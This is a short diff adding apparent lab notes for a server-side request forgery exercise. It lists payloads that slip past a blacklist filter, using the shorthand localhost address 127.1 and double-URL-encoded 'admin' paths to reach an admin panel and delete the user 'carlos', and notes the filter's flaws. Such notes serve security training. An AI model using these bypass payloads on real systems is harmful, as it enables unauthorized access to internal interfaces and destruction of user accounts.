@@ -1,0 +1,15 @@
+
+
+localhost:
+http://127.1/
+
+admin interface: 
+http://127.1/%25%36%31dmin
+http://127.1/%25%36%31%64min
+
+delete carlos:
+http://127.1/%25%36%31dmin/delete?username=carlos
+http://127.1/%25%36%31%64min/delete?username=carlos
+
+- URL decoding one time
+- regex search using a blacklist of strings
